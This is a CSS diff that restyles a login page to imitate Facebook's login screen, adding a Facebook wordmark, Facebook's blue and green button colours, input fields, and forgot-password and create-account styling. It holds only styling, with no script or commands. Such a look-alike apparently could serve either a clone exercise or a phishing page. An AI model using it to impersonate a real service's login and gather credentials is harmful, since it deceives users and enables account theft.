@@ -67,7 +67,7 @@ body {
     z-index:1;
 }
 .login-left .brand-block { position:relative; z-index:2; }
-.login-right { background:#ffffff; display:flex; flex-direction:column; justify-content:center; padding:3rem 2.5rem; }
+.login-right { background:#ffffff; display:flex; flex-direction:column; justify-content:center; padding:3.5rem 3.25rem; min-width:560px; }
 
 .login-right:before { content:""; position:absolute; left:0; top:0; bottom:0; width:1px; background:rgba(0,0,0,0.05); pointer-events:none; }
 
@@ -84,6 +84,10 @@ body {
     margin-bottom: 1rem;
     box-shadow: 0 6px 16px rgba(24,119,242,0.35);
 }
+
+/* Facebook wordmark */
+.fb-wordmark { font-family: 'Segoe UI', Arial, sans-serif; font-weight:600; font-size:3.1rem; color:#1877f2; letter-spacing:-1px; margin:0 0 1.25rem; }
+@media (max-width:600px){ .fb-wordmark { font-size:2.4rem; } }
 
 .brand-title {
     font-size: 4rem;
@@ -242,6 +246,36 @@ body {
     border-color: #1877f2;
     box-shadow: 0 0 0 2px rgba(24,119,242,.15);
 }
+
+/* Facebook-like form styles */
+.login-card.fb-style { max-width:640px; padding:2.75rem 3rem 3.25rem; border:1px solid #c9ccd1; box-shadow:0 10px 28px -4px rgba(0,0,0,0.22); }
+.fb-style-form input { height:64px; font-size:1.12rem; }
+.fb-login-button { height:64px; font-size:1.25rem; letter-spacing:.3px; }
+.create-account-button { height:60px; font-size:1.12rem; }
+.fb-wordmark { font-size:3.6rem; }
+@media (max-width:860px){ .login-card.fb-style { max-width:560px; padding:2.4rem 2.25rem 2.9rem; } }
+@media (max-width:680px){
+    .login-card.fb-style { max-width:100%; padding:2.1rem 1.6rem 2.5rem; }
+    .fb-style-form input { height:58px; font-size:1.05rem; }
+    .fb-login-button { height:58px; font-size:1.15rem; }
+    .create-account-button { height:54px; font-size:1.05rem; }
+    .fb-wordmark { font-size:3rem; }
+}
+.fb-style-form { display:flex; flex-direction:column; gap:.9rem; }
+.fb-style-form input { height:52px; font-size:.95rem; border-radius:6px; border:1px solid #dddfe2; padding:.85rem .95rem; background:#fff; }
+.fb-style-form input:focus { border-color:#1877f2; box-shadow:0 0 0 1px #1877f2, 0 0 0 4px rgba(24,119,242,0.2); }
+.fb-login-button { background:#0d63ff; color:#fff; border:none; font-weight:600; font-size:1.05rem; height:52px; border-radius:6px; cursor:pointer; box-shadow:0 1px 2px rgba(0,0,0,0.1); transition:background .2s, transform .15s; }
+.fb-login-button:hover { background:#0b58e6; }
+.fb-login-button:active { transform:scale(.97); }
+.forgot-link { text-align:center; font-size:.82rem; color:#1877f2; text-decoration:none; margin-top:.25rem; display:inline-block; }
+.forgot-link:hover { text-decoration:underline; }
+.form-separator { margin:1.1rem 0 1.2rem; border:none; border-top:1px solid #d7d9dc; }
+.create-account-button { background:#42b72a; color:#fff; border:none; font-weight:600; font-size:.95rem; height:48px; padding:0 1.25rem; border-radius:6px; cursor:pointer; margin:0 auto; display:block; transition:background .2s, transform .15s; }
+.create-account-button:hover { background:#36a420; }
+.create-account-button:active { transform:scale(.97); }
+.create-page-note { margin-top:1.4rem; font-size:.78rem; text-align:center; color:#1c1e21; }
+.create-page-note a { font-weight:600; color:#1c1e21; text-decoration:none; }
+.create-page-note a:hover { text-decoration:underline; }
 
 .facebook-login.main {
     width: 100%;
